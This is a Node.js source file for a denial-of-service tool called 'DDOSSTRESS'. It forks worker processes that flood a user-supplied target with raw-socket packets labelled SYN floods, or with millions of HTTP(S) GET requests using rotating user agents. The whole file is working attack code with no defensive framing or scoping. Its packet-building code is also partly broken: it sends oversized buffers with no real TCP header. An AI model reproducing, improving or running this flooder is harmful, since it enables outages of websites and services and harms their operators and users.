import cluster from "node:cluster";
import chalk from "chalk";
import { URL } from "url";
import { createRequire } from "module";
import net from "net";
import http from "http";
import https from "https";
import fs from "fs";
import figlet from "figlet";
import gradient from "gradient-string";

const require = createRequire(import.meta.url);
let raw;
try { raw = require("raw-socket"); } catch {}

const userAgents = fs.readFileSync("./useragents.txt", "utf-8")
                     .split("\n")
                     .filter(line => line.trim().length > 0);

if (process.argv.length < 7) {
  console.log(chalk.red("Usage: node ddosstress2.js <target> <threads> <duration_sec> --layer <layer4|layer7>"));
  process.exit(1);
}

const targetStr   = process.argv[2];
const concurrency = parseInt(process.argv[3], 10) || 5;
const durationSec = parseInt(process.argv[4], 10) || 60;
const duration    = durationSec * 1000;
const layerFlag   = process.argv[6].toLowerCase() || "layer7";
const PACKET_SIZE = 432492;

let urlObj, hostname, port, protocol;
try {
  if (/^https?:\/\//i.test(targetStr)) {
    urlObj = new URL(targetStr);
    hostname = urlObj.hostname;
    protocol = urlObj.protocol;
    port = urlObj.port ? parseInt(urlObj.port, 10) : (protocol === "https:" ? 443 : 80);
  } else {
    protocol = "http:";
    hostname = targetStr;
    port = 80;
    urlObj = new URL(`${protocol}//${hostname}:${port}`);
  }
} catch {
  console.log(chalk.red("Invalid target"));
  process.exit(1);
}

async function checkPort(host, port) {
  return new Promise(resolve => {
    const socket = net.createConnection({ host, port, timeout: 2000 }, () => {
      socket.destroy();
      resolve(true);
    });
    socket.on("error", () => resolve(false));
    socket.on("timeout", () => { socket.destroy(); resolve(false); });
  });
}

function printBanner() {
  try {
    console.log(gradient.pastel.multiline(
      figlet.textSync("DDOSSTRESS", { horizontalLayout: "default" })
    ));
  } catch {
    console.log(chalk.bold("__  __                  __  __          _                 \n" +
                           "|  \\/  | ___  __ _  __ _|  \\/  | ___  __| |_   _ ___  __ _ \n" +
                           "| |\\/| |/ _ \\/ _` |/ _` | |\\/| |/ _ \\/ _` | | | / __|/ _` |\n" +
                           "| |  | |  __/ (_| | (_| | |  | |  __/ (_| | |_| \\__ \\ (_| |\n" +
                           "|_|  |_|\\___|\\__, |\\__,_|_|  |_|\\___|\\__,_|\\__,_|___/\\__,_|\n" +
                           "              |___/                                         "));
  }

  console.log(chalk.gray(`                              v3.3\n`));
  console.log(chalk.red("-> ") + chalk.yellow("Target     ") + "📌 " + chalk.green(urlObj.href));
  console.log(chalk.red("-> ") + chalk.yellow("Threads    ") + "🧵 " + chalk.blue(concurrency));
  console.log(chalk.red("-> ") + chalk.yellow("Duration   ") + "⏱ " + chalk.green(durationSec + "s"));
  console.log(chalk.red("-> ") + chalk.yellow("Layer      ") + "🌐 " + chalk.magenta(layerFlag));
  console.log(chalk.red("------------------------------------------------------------"));
}

// --- Master ---
if (cluster.isPrimary) {
  (async () => {
    const isOpen = await checkPort(hostname, port);

    printBanner();
    console.log(chalk.yellow(`Port state : ${isOpen ? chalk.green("OPEN") : chalk.red("CLOSED")}`));

    // Fork workers secara sinkron agar log STARTED berurutan
    for (let i = 0; i < concurrency; i++) {
      await new Promise(resolve => {
        const worker = cluster.fork({
          WORKER_ID: i + 1,
          URL: urlObj.href,
          LAYER: layerFlag,
          DURATION: duration
        });
        worker.once("online", () => resolve());
      });
    }

    setTimeout(() => {
      console.log(chalk.red.bold("\n[Master] Time is up, stopping all workers..."));
      for (const id in cluster.workers) cluster.workers[id].kill();
      process.exit(0);
    }, duration);

    cluster.on("exit", (worker) => {
      const wid = worker?.process?.env?.WORKER_ID || worker.id;
      console.log(chalk.yellow(`[DDOSSTRESS] -> Thread ${wid} exited`));
    });
  })();
} else {
  const wid = parseInt(process.env.WORKER_ID, 10);
  const layer = process.env.LAYER;
  const targetUrl = new URL(process.env.URL);

  console.log(chalk.red(`[DDOSSTRESS] -> Thread ${wid} Started`));

  if (layer === "layer4") {
    mainWorkerLayer4(wid, targetUrl.hostname, targetUrl.port);
  } else {
    mainWorkerLayer7(wid, targetUrl);
  }
}

// --- Layer 4 ---
function sendSyn(target, port, socket) {
  try {
    const buffer = Buffer.alloc(PACKET_SIZE);
    buffer.writeUInt16BE(Math.floor(Math.random() * 5148), 10);
    buffer.writeUInt32BE(Math.floor(Math.random() * 0xffffffff), 4);
    socket.send(buffer, 0, buffer.length, target, () => {});
  } catch {}
}

async function mainWorkerLayer4(workerId, host, port) {
  let sentBytes = 0, errors = 0;
  let rawSocket;
  try {
    rawSocket = raw.createSocket({ protocol: raw.Protocol.TCP });
  } catch {
    console.log(chalk.red("[Error] Raw socket creation failed. Run as root."));
    process.exit(1);
  }
  rawSocket.on("error", () => errors++);

  const startTime = Date.now();
  const endTime = startTime + duration;

  while (Date.now() < endTime) {
    for (let i = 0; i < 5000; i++) {
      sendSyn(host, port, rawSocket);
      sentBytes += PACKET_SIZE;
    }

    if ((Date.now() - startTime) % 1000 < 50) {
      console.log(`[DDOSSTRESS] -> Sent SYN packets: ${Math.floor(sentBytes / PACKET_SIZE)}, Errors: ${errors}`);
    }
    await new Promise(r => setImmediate(r));
  }

  console.log(chalk.cyan(`[Worker #${workerId}] Total SYN packets : ${sentBytes / PACKET_SIZE}`));
  console.log(chalk.red(`[Worker #${workerId}] Errors            : ${errors}`));
  rawSocket.close();
  process.exit(0);
}

// --- Layer 7 ---
async function mainWorkerLayer7(workerId, targetUrl) {
  let sentRequests = 0, errors = 0;
  const lib = targetUrl.protocol === "https:" ? https : http;
  const agent = new lib.Agent({ keepAlive: true, maxSockets: 20000 });

  const startTime = Date.now();
  const endTime = startTime + duration;

  while (sentRequests < 5000000 && Date.now() < endTime) {
    const batch = [];
    const BATCH_SIZE = 900;

    for (let i = 0; i < BATCH_SIZE && sentRequests + i < 5000000; i++) {
      const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
      batch.push(new Promise(resolve => {
        const req = lib.get(targetUrl, { agent, headers: { "User-Agent": randomUA } }, res => {
          res.resume();
          if (Math.random() < 0.05) {
            console.log(`[DDOSSTRESS] -> (${res.statusCode}) (${targetUrl.href}) /`);
          }
          resolve();
        });
        req.on("error", () => { errors++; resolve(); });
      }));
    }

    await Promise.all(batch);
    sentRequests += batch.length;

    if ((Date.now() - startTime) % 1000 < 50) {
      console.log(`[DDOSSTRESS] -> Sent: ${sentRequests}, Errors: ${errors}`);
    }

    await new Promise(r => setTimeout(r, 10));
  }

  console.log(chalk.cyan(`[Worker #${workerId}] Total HTTP requests : ${sentRequests}`));
  console.log(chalk.red(`[Worker #${workerId}] Total errors        : ${errors}`));
  process.exit(0);
}

